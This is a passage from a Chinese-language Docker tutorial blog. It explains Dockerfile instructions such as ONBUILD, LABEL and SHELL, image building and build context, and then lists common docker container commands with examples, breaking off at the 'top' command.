<p>为了帮助排障，健康检查命令的输出（包括 <code>stdout</code> 以及 <code>stderr</code>）都会被存储于健康状态里，可以用 <code>docker inspect</code> 来查看。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker inspect --format <span class="string">'{{json .State.Health}}'</span> web | python -m json.tool</span><br><span class="line">{</span><br><span class="line">    <span class="string">"FailingStreak"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"Log"</span>: [</span><br><span class="line">        {</span><br><span class="line">            <span class="string">"End"</span>: <span class="string">"2016-11-25T14:35:37.940957051Z"</span>,</span><br><span class="line">            <span class="string">"ExitCode"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">"Output"</span>: <span class="string">"&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Welcome to nginx!&lt;/title&gt;\n&lt;style&gt;\n    body {\n        width: 35em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    }\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;\n&lt;p&gt;If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.&lt;/p&gt;\n\n&lt;p&gt;For online documentation and support please refer to\n&lt;a href=\"http://nginx.org/\"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;\nCommercial support is available at\n&lt;a href=\"http://nginx.com/\"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;\n\n&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n"</span>,</span><br><span class="line">            <span class="string">"Start"</span>: <span class="string">"2016-11-25T14:35:37.780192565Z"</span></span><br><span class="line">        }</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"Status"</span>: <span class="string">"healthy"</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h3 id="ONBUILD延迟构建命令"><a href="#ONBUILD延迟构建命令" class="headerlink" title="ONBUILD延迟构建命令"></a><code>ONBUILD</code>延迟构建命令</h3><p>格式：<code>ONBUILD &lt;其它指令&gt;</code></p>
<p><code>ONBUILD</code> 是一个特殊的指令，它后面跟的是其它指令，比如 <code>RUN</code>, <code>COPY</code> 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。</p>
<p><code>Dockerfile</code> 中的其它指令都是为了定制当前镜像而准备的，唯有 <code>ONBUILD</code> 是为了帮助别人定制而准备的。</p>
<p>假设制作 Node.js 所写的应用的镜像。已知 Node.js 使用 <code>npm</code> 进行包管理，所有依赖、配置、启动信息等会放到 <code>package.json</code> 文件里。在拿到程序代码后，需要先进行 <code>npm install</code> 才可以获得所有需要的依赖。然后就可以通过 <code>npm start</code> 来启动应用。因此，一般来说会这样写 <code>Dockerfile</code>：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:slim</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./package.json /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [ <span class="string">"npm"</span>, <span class="string">"install"</span> ]</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">"npm"</span>, <span class="string">"start"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>把这个 <code>Dockerfile</code> 放到 Node.js 项目的根目录，构建好镜像后，就可以直接拿来启动容器运行。但是如果还有第二个 Node.js 项目，那就再把这个 <code>Dockerfile</code> 复制到第二个项目里。那如果有第三个项目就需要再复制一次。文件的副本越多，版本控制就越困难。</p>
<p>如果第一个 Node.js 项目在开发过程中，发现这个 <code>Dockerfile</code> 里存在问题，比如敲错字了、或者需要安装额外的包，然后开发人员修复了这个 <code>Dockerfile</code>，再次构建，问题解决。第一个项目没问题了，但是第二个项目仍然存在相同的问题，并不会被自动修复。</p>
<p>一个解决方法是做一个基础镜像，然后各个项目使用这个基础镜像。这样基础镜像更新，各个项目不用同步 <code>Dockerfile</code> 的变化，重新构建后就继承了基础镜像的更新。那么上面的这个 <code>Dockerfile</code> 就会变为：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:slim</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">"npm"</span>, <span class="string">"start"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>把项目相关的构建指令拿出来，放到子项目里去。假设这个基础镜像的名字为 <code>my-node</code> 的话，各个项目内的自己的 <code>Dockerfile</code> 就变为：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> my-node</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./package.json /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [ <span class="string">"npm"</span>, <span class="string">"install"</span> ]</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app/</span></span><br></pre></td></tr></table></figure>

<p>基础镜像变化后，各个项目都用这个 <code>Dockerfile</code> 重新构建镜像，会继承基础镜像的更新。</p>
<p>那么，问题解决了么？没有。准确说，只解决了一半。如果这个 <code>Dockerfile</code> 里面有些东西需要调整呢？比如 <code>npm install</code> 都需要加一些参数，那怎么办？这一行 <code>RUN</code> 是不可能放入基础镜像的，因为涉及到了当前项目的 <code>./package.json</code>，难道又要一个个修改么？所以说，这样制作基础镜像，只解决了原来的 <code>Dockerfile</code> 的前4条指令的变化问题，而后面三条指令的变化则完全没办法处理。</p>
<p><code>ONBUILD</code> 可以解决这个问题。使用 <code>ONBUILD</code> 重新写一下基础镜像的 <code>Dockerfile</code>:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:slim</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">ONBUILD</span> <span class="keyword">COPY</span><span class="language-bash"> ./package.json /app</span></span><br><span class="line"><span class="keyword">ONBUILD</span> <span class="keyword">RUN</span><span class="language-bash"> [ <span class="string">"npm"</span>, <span class="string">"install"</span> ]</span></span><br><span class="line"><span class="keyword">ONBUILD</span> <span class="keyword">COPY</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">"npm"</span>, <span class="string">"start"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>回到原始的 <code>Dockerfile</code>，这次将项目相关的指令加上 <code>ONBUILD</code>，这样在构建基础镜像的时候，这三行并不会被执行。然后各个项目的 <code>Dockerfile</code> 就变成：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> my-node</span><br></pre></td></tr></table></figure>

<p>当在各个项目目录中，用这个只有一行的 <code>Dockerfile</code> 构建镜像时，之前基础镜像的那三行 <code>ONBUILD</code> 就会开始执行，成功的将当前项目的代码复制进镜像、并且针对本项目执行 <code>npm install</code>，生成应用镜像。</p>
<h3 id="LABEL为镜像添加元数据"><a href="#LABEL为镜像添加元数据" class="headerlink" title="LABEL为镜像添加元数据"></a><code>LABEL</code>为镜像添加元数据</h3><p><code>LABEL</code> 指令用来给镜像以键值对的形式添加一些元数据（metadata），格式如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span></span><br></pre></td></tr></table></figure>

<p>可以用一些标签来申明镜像的作者、文档地址等：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> org.opencontainers.image.authors=<span class="string">"yeasy"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> org.opencontainers.image.documentation=<span class="string">"https://yeasy.gitbooks.io"</span></span></span><br></pre></td></tr></table></figure>

<p>具体可以参考 <a href="https://github.com/opencontainers/image-spec/blob/master/annotations.md">https://github.com/opencontainers/image-spec/blob/master/annotations.md</a></p>
<h3 id="SHELL指令"><a href="#SHELL指令" class="headerlink" title="SHELL指令"></a><code>SHELL</code>指令</h3><p>格式：<code>SHELL ["executable", "parameters"]</code></p>
<p><code>SHELL</code> 指令可以指定 <code>RUN</code> <code>ENTRYPOINT</code> <code>CMD</code> 指令的 shell，Linux 中默认为 `[“/bin/sh”, “-c”]</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHELL</span><span class="language-bash"> [<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> lll ; <span class="built_in">ls</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SHELL</span><span class="language-bash"> [<span class="string">"/bin/sh"</span>, <span class="string">"-cex"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> lll ; <span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure>

<p>两个 <code>RUN</code> 运行同一命令，第二个 <code>RUN</code> 运行的命令会打印出每条命令并当遇到错误时退出。</p>
<p>当 <code>ENTRYPOINT</code> <code>CMD</code> 以 shell 格式指定时，<code>SHELL</code> 指令所指定的 shell 也会成为这两个指令的 shell</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHELL</span><span class="language-bash"> [<span class="string">"/bin/sh"</span>, <span class="string">"-cex"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh -cex "nginx"</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> nginx</span></span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHELL</span><span class="language-bash"> [<span class="string">"/bin/sh"</span>, <span class="string">"-cex"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh -cex "nginx"</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> nginx</span></span><br></pre></td></tr></table></figure>

<h2 id="Dockerfile构建镜像"><a href="#Dockerfile构建镜像" class="headerlink" title="Dockerfile构建镜像"></a>Dockerfile构建镜像</h2><p>以定制nginx镜像为例（构建好的镜像内会有一个 /usr/share/nginx/html/index.html 文件）</p>
<ul>
<li><p>在一个空白目录中，建立一个文本文件，并命名为 <code>Dockerfile</code>：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir mynginx</span><br><span class="line">cd mynginx</span><br><span class="line">touch Dockerfile</span><br></pre></td></tr></table></figure></li>
<li><p>其内容为：</p>
  <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">'&lt;h1&gt;Hello, Docker!&lt;/h1&gt;'</span> &gt; /usr/share/nginx/html/index.html</span></span><br></pre></td></tr></table></figure></li>
<li><p>在 <code>Dockerfile</code> 文件所在目录执行</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line">Step 1 : FROM nginx</span><br><span class="line"> ---&gt; e43d811ce2f4</span><br><span class="line">Step 2 : RUN <span class="built_in">echo</span> <span class="string">'&lt;h1&gt;Hello, Docker!&lt;/h1&gt;'</span> &gt; /usr/share/nginx/html/index.html</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 9cdc27646c7b</span><br><span class="line"> ---&gt; 44aa4490ce2c</span><br><span class="line">Removing intermediate container 9cdc27646c7b</span><br><span class="line">Successfully built 44aa4490ce2c</span><br></pre></td></tr></table></figure>

<p>  从命令的输出结果中，可以清晰的看到镜像的构建过程。在 <code>Step 2</code> 中，<code>RUN</code> 指令启动了一个容器 <code>9cdc27646c7b</code>，执行了所要求的命令，并最后提交了这一层 <code>44aa4490ce2c</code>，随后删除了所用到的这个容器 <code>9cdc27646c7b</code>。</p>
</li>
<li><p><code>docker build</code> 命令进行镜像构建的格式为</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build [选项] &lt;上下文路径/URL/-&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="镜像构建上下文（Context）"><a href="#镜像构建上下文（Context）" class="headerlink" title="镜像构建上下文（Context）"></a>镜像构建上下文（Context）</h3><p><code>docker build</code> 命令最后有一个 <code>.</code>。<code>.</code> 表示当前目录，而 <code>Dockerfile</code> 就在当前目录，因此不少初学者以为这个路径是在指定 <code>Dockerfile</code> 所在路径，这么理解其实是不准确的。对应上面的命令格式，这是在指定 <strong>上下文路径</strong>。</p>
<p>要理解上下文路径，首先要理解 <code>docker build</code> 的工作原理。Docker 在运行时分为 Docker 引擎（也就是服务端守护进程）和客户端工具。Docker 的引擎提供了一组 REST API，被称为 <a href="https://docs.docker.com/develop/sdk/">Docker Remote API</a>，而如 <code>docker</code> 命令这样的客户端工具，则是通过这组 API 与 Docker 引擎交互，从而完成各种功能。因此，虽然表面上好像是在本机执行各种 <code>docker</code> 功能，但实际上，一切都是使用的远程调用形式在服务端（Docker 引擎）完成。也因为这种 C/S 设计，使得操作远程服务器的 Docker 引擎变得轻而易举。</p>
<p>进行镜像构建时，并非所有定制都会通过 <code>RUN</code> 指令完成，经常会需要将一些本地文件复制进镜像，比如通过 <code>COPY</code> 指令、<code>ADD</code> 指令等。而 <code>docker build</code> 命令构建镜像，其实并非在本地构建，而是在服务端即 Docker 引擎中构建的。那么在这种客户端/服务端的架构中，如何才能让服务端获得本地文件呢？</p>
<p>这就引入了上下文的概念。当构建的时候，用户会指定构建镜像上下文的路径，<code>docker build</code> 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。这样 Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。</p>
<p>如果在 <code>Dockerfile</code> 中使用如下命令：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./package.json /app/</span></span><br></pre></td></tr></table></figure>

<p>并不是要复制执行 <code>docker build</code> 命令所在的目录下的 <code>package.json</code>，也不是复制 <code>Dockerfile</code> 所在目录下的 <code>package.json</code>，而是复制 <strong>上下文（context）</strong> 目录下的 <code>package.json</code>。</p>
<p>因此，<code>COPY</code> 这类指令中的源文件的路径都是<em>相对路径</em>。这也是 <code>COPY ../package.json /app</code> 或者 <code>COPY /opt/xxxx /app</code> 无法工作的原因，因为这些路径已经超出了上下文的范围，Docker 引擎无法获得这些位置的文件。如果真的需要那些文件，应该将它们复制到上下文目录中去。</p>
<p>现在就可以理解刚才的命令 <code>docker build -t nginx:v3 .</code> 中的这个 <code>.</code>，实际上是在指定上下文的目录，<code>docker build</code> 命令会将该目录下的内容打包交给 Docker 引擎以帮助构建镜像。</p>
<p>如果观察 <code>docker build</code> 输出，其实已经看到了这个发送上下文的过程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>理解构建上下文对于镜像构建是很重要的，避免犯一些不应该的错误。比如有些初学者在发现 <code>COPY /opt/xxxx /app</code> 不工作后，于是干脆将 <code>Dockerfile</code> 放到了硬盘根目录去构建，结果发现 <code>docker build</code> 执行后，在发送一个几十 GB 的东西，极为缓慢而且很容易构建失败。那是因为这种做法是在让 <code>docker build</code> 打包整个硬盘，这显然是使用错误。</p>
<p>一般来说，应该会将 <code>Dockerfile</code> 置于一个空目录下，或者项目根目录下。如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给 Docker 引擎，那么可以用 <code>.gitignore</code> 一样的语法写一个 <code>.dockerignore</code>，该文件是用于剔除不需要作为上下文传递给 Docker 引擎的。</p>
<p>在默认情况下，如果不额外指定 <code>Dockerfile</code> 的话，会将上下文目录下的名为 <code>Dockerfile</code> 的文件作为 Dockerfile。</p>
<p>实际上 <code>Dockerfile</code> 的文件名并不要求必须为 <code>Dockerfile</code>，而且并不要求必须位于上下文目录中，比如可以用 <code>-f ../Dockerfile.php</code> 参数指定某个文件作为 <code>Dockerfile</code>。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></p>
<p>[2] <a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">https://docs.docker.com/develop/develop-images/dockerfile_best-practices/</a></p>
<p>[3] <a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile">https://yeasy.gitbook.io/docker_practice/image/dockerfile</a></p>
]]></content>
      <categories>
        <category>docker learning</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>Dockerfile</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker命令汇总</title>
    <url>/Docker%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB.html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>总结docker相关命令。<span id="more"></span></p>
<h2 id="容器生命周期管理"><a href="#容器生命周期管理" class="headerlink" title="容器生命周期管理"></a>容器生命周期管理</h2><h3 id="run"><a href="#run" class="headerlink" title="run"></a><code>run</code></h3><p>创建一个新的容器并运行一个命令</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li>  <code>-a stdin</code>:  指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</li>
<li>  <strong><code>-d</code>:  后台运行容器，并返回容器ID；</strong></li>
<li>  <strong><code>-i</code>:  以交互模式运行容器，通常与 -t 同时使用；</strong></li>
<li>  <code>-P</code>:  随机端口映射，容器内部端口<strong>随机</strong>映射到主机的端口；</li>
<li>  <strong><code>-p</code>:  指定端口映射，格式为：主机(宿主)端口:容器端口；</strong></li>
<li>  <strong><code>-t</code>:  为容器重新分配一个伪输入终端，通常与 -i 同时使用；</strong></li>
<li>  <strong><code>--name="nginx-lb"</code>:  为容器指定一个名称；</strong></li>
<li>  <code>--dns 8.8.8.8</code>:  指定容器使用的DNS服务器，默认和宿主一致；</li>
<li>  <code>--dns-search example.com</code>:  指定容器DNS搜索域名，默认和宿主一致；</li>
<li>  <code>-h "mars"</code>:  指定容器的hostname；</li>
<li>  <code>-e username="ritchie"</code>:  设置环境变量；</li>
<li>  <code>--env-file=[]</code>: 从指定文件读入环境变量；</li>
<li>  <code>--cpuset="0-2" or --cpuset="0,1,2"</code>:  绑定容器到指定CPU运行；</li>
<li>  <code>-m </code>:  设置容器使用内存最大值；</li>
<li>  <code>--net="bridge"</code>:  指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</li>
<li>  <code>--link=[]</code>:  添加链接到另一个容器；</li>
<li>  <code>--expose=[]</code>:  开放一个端口或一组端口；</li>
<li>  <code>--volume , -v</code>:  绑定一个卷；</li>
</ul>
</li>
<li><p>实例</p>
<p>  使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -p 80:80 -v /data:/data -d nginx:latest</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="start-stop-restart"><a href="#start-stop-restart" class="headerlink" title="start/stop/restart"></a><code>start/stop/restart</code></h3><p>容器启动/停止/重启</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">docker stop [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">docker restart [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure></li>
<li><p>实例</p>
<p>  启动已被停止的容器myrunoob</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start myrunoob</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a><code>kill</code></h3><p>杀掉运行中的容器</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker kill [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li>  <code>-s </code>: 向容器发送一个信号；</li>
</ul>
</li>
</ul>
<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a><code>rm</code></h3><p>删除一个或多个容器</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-f </code>: 通过 SIGKILL 信号强制删除一个运行中的容器；</p>
</li>
<li><p>  <code>-l </code>: 移除容器间的网络连接，而非容器本身；</p>
</li>
<li><p>  <code>-v</code> : 删除与容器关联的卷；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  强制删除容器 db01、db02：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f db01 db02</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="pause-unpause"><a href="#pause-unpause" class="headerlink" title="pause/unpause"></a><code>pause/unpause</code></h3><p>暂停/恢复容器所有进程</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pause CONTAINER [CONTAINER...]</span><br><span class="line">docker unpause CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure></li>
<li><p>实例</p>
<p>  暂停数据库容器db01提供服务。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pause db01</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="create"><a href="#create" class="headerlink" title="create"></a><code>create</code></h3><p>创建一个新的容器但不启动</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker create [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure></li>
<li><p>实例</p>
<p>  使用docker镜像nginx:latest创建一个容器,并将容器命名为myrunoob</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker create  --name myrunoob  nginx:latest</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a><code>exec</code></h3><p>在运行的容器中执行命令</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-d</code>: 分离模式: 在后台运行；</p>
</li>
<li><p>  <strong><code>-i</code>: 即使没有附加也保持STDIN 打开；</strong></p>
</li>
<li><p>  <strong><code>-t</code>: 分配一个伪终端；</strong></p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  在容器 mynginx 中以交互模式执行容器内 /root/runoob.sh 脚本:</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it mynginx /bin/sh /root/runoob.sh</span><br></pre></td></tr></table></figure>

<p>  在容器 mynginx 中开启一个交互模式的终端:</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i -t  mynginx /bin/bash</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a><code>ps</code></h3><p>列出容器</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps [OPTIONS]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <strong><code>-a</code> : 显示所有的容器，包括未运行的；</strong></p>
</li>
<li><p>  <code>-f</code> : 根据条件过滤显示的内容；</p>
</li>
<li><p>  <code>--format</code> : 指定返回值的模板文件；</p>
</li>
<li><p>  <code>-l</code> : 显示最近创建的容器；</p>
</li>
<li><p>  <code>-n</code> : 列出最近创建的n个容器；</p>
</li>
<li><p>  <code>--no-trunc</code> : 不截断输出；</p>
</li>
<li><p>  <code>-q</code> : 静默模式，只显示容器编号；</p>
</li>
<li><p>  <code>-s</code> : 显示总的文件大小；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  列出所有在运行的容器信息</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                ...  PORTS                    NAMES</span><br><span class="line">09b93464c2f7   nginx:latest   "nginx -g 'daemon off" ...  80/tcp, 443/tcp          myrunoob</span><br><span class="line">96f7f14e99ab   mysql:5.6      "docker-entrypoint.sh" ...  0.0.0.0:3306-&gt;3306/tcp   mymysql</span><br></pre></td></tr></table></figure></li>
<li><p>输出详情介绍：</p>
<ul>
<li><p>  <strong>CONTAINER ID:</strong> 容器 ID；</p>
</li>
<li><p>  <strong>IMAGE:</strong> 使用的镜像；</p>
</li>
<li><p>  <strong>COMMAND:</strong> 启动容器时运行的命令；</p>
</li>
<li><p>  <strong>CREATED:</strong> 容器的创建时间；</p>
</li>
<li><p><strong>STATUS:</strong> 容器状态，状态有7种；</p>
<ul>
<li><p>  created（已创建）</p>
</li>
<li><p>  restarting（重启中）</p>
</li>
<li><p>  running（运行中）</p>
</li>
<li><p>  removing（迁移中）</p>
</li>
<li><p>  paused（暂停）</p>
</li>
<li><p>  exited（停止）</p>
</li>
<li><p>  dead（死亡）</p>
</li>
</ul>
</li>
<li><p>  <strong>PORTS:</strong> 容器的端口信息和使用的连接类型（tcp\udp）；</p>
</li>
<li><p>  <strong>NAMES:</strong> 自动分配的容器名称；</p>
</li>
</ul>
</li>
</ul>
<p>​    </p>
<h3 id="inspect"><a href="#inspect" class="headerlink" title="inspect"></a><code>inspect</code></h3><p>获取容器/镜像的元数据。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect [OPTIONS] NAME|ID [NAME|ID...]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-f</code> : 指定返回值的模板文件；</p>
</li>
<li><p>  <code>-s</code> : 显示总的文件大小；</p>
</li>
<li><p>  <code>--type</code> : 为指定类型返回JSON；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  获取镜像mysql:5.6的元信息</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect mysql:5.6</span><br><span class="line">[</span><br><span class="line">    {</span><br><span class="line">        "Id": "sha256:2c0964ec182ae9a045f866bbc2553087f6e42bfc16074a74fb820af235f070ec",</span><br><span class="line">        "RepoTags": [</span><br><span class="line">            "mysql:5.6"</span><br><span class="line">        ],</span><br><span class="line">        "RepoDigests": [],</span><br><span class="line">        "Parent": "",</span><br><span class="line">        "Comment": "",</span><br><span class="line">        "Created": "2016-05-24T04:01:41.168371815Z",</span><br><span class="line">        "Container": "e0924bc460ff97787f34610115e9363e6363b30b8efa406e28eb495ab199ca54",</span><br><span class="line">        "ContainerConfig": {</span><br><span class="line">            "Hostname": "b0cf605c7757",</span><br><span class="line">            "Domainname": "",</span><br><span class="line">            "User": "",</span><br><span class="line">            "AttachStdin": false,</span><br><span class="line">            "AttachStdout": false,</span><br><span class="line">            "AttachStderr": false,</span><br><span class="line">            "ExposedPorts": {</span><br><span class="line">                "3306/tcp": {}</span><br><span class="line">            },</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>  获取正在运行的容器mymysql的 IP</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mymysql</span><br><span class="line">172.17.0.3</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="top"><a href="#top" class="headerlink" title="top"></a><code>top</code></h3><p>查看容器中运行的进程信息，支持 ps 命令参数。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker top [OPTIONS] CONTAINER [ps OPTIONS]</span><br></pre></td></tr></table></figure>

<p>  容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看container中正在运行的进程。</p>
</li>
<li><p>实例</p>
<p>  查看容器mymysql的进程信息。</p>
